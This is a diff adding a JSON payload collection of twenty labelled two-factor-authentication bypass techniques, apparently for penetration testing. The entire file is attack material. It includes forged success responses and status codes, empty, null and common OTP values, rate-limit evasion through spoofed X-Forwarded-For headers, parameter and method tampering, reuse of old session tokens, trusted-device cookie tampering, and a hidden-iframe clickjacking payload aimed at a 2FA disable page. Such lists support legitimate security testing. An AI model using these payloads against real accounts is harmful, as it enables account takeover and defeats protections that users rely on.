@@ -1,0 +1,376 @@
+{
+    "category": "2FA Bypass",
+    "description": "Two-Factor Authentication bypass techniques and payloads for security testing",
+    "payloads": [
+        {
+            "id": "2fa-bypass-001",
+            "title": "Direct Access After Login",
+            "payload": "/dashboard\n/account\n/home\n/profile",
+            "category": "2FA Bypass",
+            "subcategory": "Direct Navigation",
+            "context": [
+                "url",
+                "navigation"
+            ],
+            "level": "low",
+            "tags": [
+                "direct",
+                "navigation",
+                "skip"
+            ],
+            "notes": "Try accessing protected pages directly after entering password, skipping 2FA step",
+            "source": "manual"
+        },
+        {
+            "id": "2fa-bypass-002",
+            "title": "Response Manipulation - Success",
+            "payload": "{\"success\":true,\"verified\":true}",
+            "category": "2FA Bypass",
+            "subcategory": "Response Manipulation",
+            "context": [
+                "json",
+                "response"
+            ],
+            "level": "medium",
+            "tags": [
+                "response",
+                "manipulation",
+                "json"
+            ],
+            "notes": "Intercept and modify server response to indicate successful 2FA verification",
+            "source": "manual"
+        },
+        {
+            "id": "2fa-bypass-003",
+            "title": "Status Code Change",
+            "payload": "HTTP/1.1 200 OK\n(Change 4xx to 200)",
+            "category": "2FA Bypass",
+            "subcategory": "Response Manipulation",
+            "context": [
+                "http",
+                "response"
+            ],
+            "level": "medium",
+            "tags": [
+                "response",
+                "status",
+                "code"
+            ],
+            "notes": "Change HTTP status code from 403/401 to 200 in response",
+            "source": "manual"
+        },
+        {
+            "id": "2fa-bypass-004",
+            "title": "Empty OTP Code",
+            "payload": "",
+            "category": "2FA Bypass",
+            "subcategory": "Input Validation",
+            "context": [
+                "form",
+                "input"
+            ],
+            "level": "low",
+            "tags": [
+                "empty",
+                "null",
+                "otp"
+            ],
+            "notes": "Submit empty OTP code - some systems don't validate empty input",
+            "source": "manual"
+        },
+        {
+            "id": "2fa-bypass-005",
+            "title": "Null Values",
+            "payload": "null\n\"null\"\nNone\nnil",
+            "category": "2FA Bypass",
+            "subcategory": "Input Validation",
+            "context": [
+                "json",
+                "input"
+            ],
+            "level": "low",
+            "tags": [
+                "null",
+                "validation",
+                "bypass"
+            ],
+            "notes": "Try various null representations in OTP field",
+            "source": "manual"
+        },
+        {
+            "id": "2fa-bypass-006",
+            "title": "Default/Common OTP Codes",
+            "payload": "000000\n123456\n111111\n999999\n123123\n112233",
+            "category": "2FA Bypass",
+            "subcategory": "Brute Force",
+            "context": [
+                "input"
+            ],
+            "level": "low",
+            "tags": [
+                "default",
+                "common",
+                "bruteforce"
+            ],
+            "notes": "Try common/default OTP codes that might be hardcoded",
+            "source": "manual"
+        },
+        {
+            "id": "2fa-bypass-007",
+            "title": "Rate Limit Bypass - IP Rotation",
+            "payload": "X-Forwarded-For: 127.0.0.1\nX-Real-IP: 127.0.0.1\nX-Originating-IP: 127.0.0.1\nX-Remote-IP: 127.0.0.1\nX-Client-IP: 127.0.0.1",
+            "category": "2FA Bypass",
+            "subcategory": "Rate Limit",
+            "context": [
+                "header"
+            ],
+            "level": "medium",
+            "tags": [
+                "ratelimit",
+                "ip",
+                "header"
+            ],
+            "notes": "Add headers to bypass rate limiting on OTP attempts",
+            "source": "manual"
+        },
+        {
+            "id": "2fa-bypass-008",
+            "title": "Backup Code Endpoint",
+            "payload": "/2fa/backup\n/auth/backup-codes\n/verify/backup\n/mfa/recovery",
+            "category": "2FA Bypass",
+            "subcategory": "Endpoint Discovery",
+            "context": [
+                "url"
+            ],
+            "level": "medium",
+            "tags": [
+                "backup",
+                "recovery",
+                "endpoint"
+            ],
+            "notes": "Look for backup code verification endpoints that might be less protected",
+            "source": "manual"
+        },
+        {
+            "id": "2fa-bypass-009",
+            "title": "Previous Valid OTP Reuse",
+            "payload": "[Previously used valid OTP code]",
+            "category": "2FA Bypass",
+            "subcategory": "Token Reuse",
+            "context": [
+                "input"
+            ],
+            "level": "medium",
+            "tags": [
+                "reuse",
+                "replay",
+                "token"
+            ],
+            "notes": "Try reusing a previously valid OTP - check if OTP invalidation works",
+            "source": "manual"
+        },
+        {
+            "id": "2fa-bypass-010",
+            "title": "Remove 2FA Parameter",
+            "payload": "DELETE: otp=\nDELETE: code=\nDELETE: token=\nDELETE: 2fa=",
+            "category": "2FA Bypass",
+            "subcategory": "Parameter Tampering",
+            "context": [
+                "request",
+                "parameter"
+            ],
+            "level": "medium",
+            "tags": [
+                "parameter",
+                "remove",
+                "delete"
+            ],
+            "notes": "Remove OTP parameter entirely from request",
+            "source": "manual"
+        },
+        {
+            "id": "2fa-bypass-011",
+            "title": "Array of OTP Values",
+            "payload": "{\"otp\":[\"000000\",\"111111\",\"123456\"]}\n{\"code\":[\"000000\",\"111111\",\"123456\"]}",
+            "category": "2FA Bypass",
+            "subcategory": "Parameter Tampering",
+            "context": [
+                "json"
+            ],
+            "level": "medium",
+            "tags": [
+                "array",
+                "multiple",
+                "json"
+            ],
+            "notes": "Send array of OTP values - some parsers take first valid one",
+            "source": "manual"
+        },
+        {
+            "id": "2fa-bypass-012",
+            "title": "Change Request Method",
+            "payload": "GET -> POST\nPOST -> GET\nPOST -> PUT\nPOST -> PATCH",
+            "category": "2FA Bypass",
+            "subcategory": "Method Tampering",
+            "context": [
+                "http",
+                "method"
+            ],
+            "level": "medium",
+            "tags": [
+                "method",
+                "http",
+                "change"
+            ],
+            "notes": "Try different HTTP methods on 2FA verification endpoint",
+            "source": "manual"
+        },
+        {
+            "id": "2fa-bypass-013",
+            "title": "Referrer Header Manipulation",
+            "payload": "Referer: https://target.com/dashboard\nReferer: https://target.com/2fa/success\nReferer: https://target.com/verified",
+            "category": "2FA Bypass",
+            "subcategory": "Header Manipulation",
+            "context": [
+                "header"
+            ],
+            "level": "medium",
+            "tags": [
+                "referer",
+                "header",
+                "spoof"
+            ],
+            "notes": "Spoof referrer to appear as coming from post-2FA page",
+            "source": "manual"
+        },
+        {
+            "id": "2fa-bypass-014",
+            "title": "Session Token from Pre-2FA",
+            "payload": "[Use session token obtained before 2FA was enabled]",
+            "category": "2FA Bypass",
+            "subcategory": "Session Manipulation",
+            "context": [
+                "cookie",
+                "session"
+            ],
+            "level": "high",
+            "tags": [
+                "session",
+                "token",
+                "old"
+            ],
+            "notes": "Use old session token from before 2FA was enabled on account",
+            "source": "manual"
+        },
+        {
+            "id": "2fa-bypass-015",
+            "title": "OAuth/SSO Bypass",
+            "payload": "/auth/google\n/auth/github\n/login/oauth\n/sso/callback",
+            "category": "2FA Bypass",
+            "subcategory": "Alternative Auth",
+            "context": [
+                "url"
+            ],
+            "level": "medium",
+            "tags": [
+                "oauth",
+                "sso",
+                "social"
+            ],
+            "notes": "Try OAuth/SSO login which might skip 2FA requirement",
+            "source": "manual"
+        },
+        {
+            "id": "2fa-bypass-016",
+            "title": "Password Reset Flow",
+            "payload": "/forgot-password\n/reset-password\n/password/reset",
+            "category": "2FA Bypass",
+            "subcategory": "Alternative Auth",
+            "context": [
+                "url"
+            ],
+            "level": "medium",
+            "tags": [
+                "password",
+                "reset",
+                "flow"
+            ],
+            "notes": "Password reset might create new session without 2FA",
+            "source": "manual"
+        },
+        {
+            "id": "2fa-bypass-017",
+            "title": "CSRF Token Leakage",
+            "payload": "Check:\n- Page source\n- JavaScript files\n- API responses\n- Error messages",
+            "category": "2FA Bypass",
+            "subcategory": "Token Leakage",
+            "context": [
+                "reconnaissance"
+            ],
+            "level": "high",
+            "tags": [
+                "csrf",
+                "token",
+                "leak"
+            ],
+            "notes": "Look for leaked tokens that can be used to bypass 2FA CSRF protection",
+            "source": "manual"
+        },
+        {
+            "id": "2fa-bypass-018",
+            "title": "Clickjacking 2FA Page",
+            "payload": "<iframe src=\"https://target.com/2fa/disable\" style=\"opacity:0\"></iframe>",
+            "category": "2FA Bypass",
+            "subcategory": "Clickjacking",
+            "context": [
+                "html"
+            ],
+            "level": "high",
+            "tags": [
+                "clickjacking",
+                "iframe",
+                "disable"
+            ],
+            "notes": "Frame 2FA disable page to trick user into disabling their 2FA",
+            "source": "manual"
+        },
+        {
+            "id": "2fa-bypass-019",
+            "title": "Mobile App Token Reuse",
+            "payload": "[Captured mobile app authentication token]",
+            "category": "2FA Bypass",
+            "subcategory": "Token Reuse",
+            "context": [
+                "mobile",
+                "token"
+            ],
+            "level": "high",
+            "tags": [
+                "mobile",
+                "app",
+                "token"
+            ],
+            "notes": "Mobile apps sometimes use tokens that bypass 2FA for web",
+            "source": "manual"
+        },
+        {
+            "id": "2fa-bypass-020",
+            "title": "Remember Device Manipulation",
+            "payload": "trusted_device=true\nremember_device=1\nskip_2fa=true\ndevice_verified=true",
+            "category": "2FA Bypass",
+            "subcategory": "Cookie/Parameter Manipulation",
+            "context": [
+                "cookie",
+                "parameter"
+            ],
+            "level": "medium",
+            "tags": [
+                "remember",
+                "device",
+                "cookie"
+            ],
+            "notes": "Manipulate trusted device cookies/parameters",
+            "source": "manual"
+        }
+    ]
+}
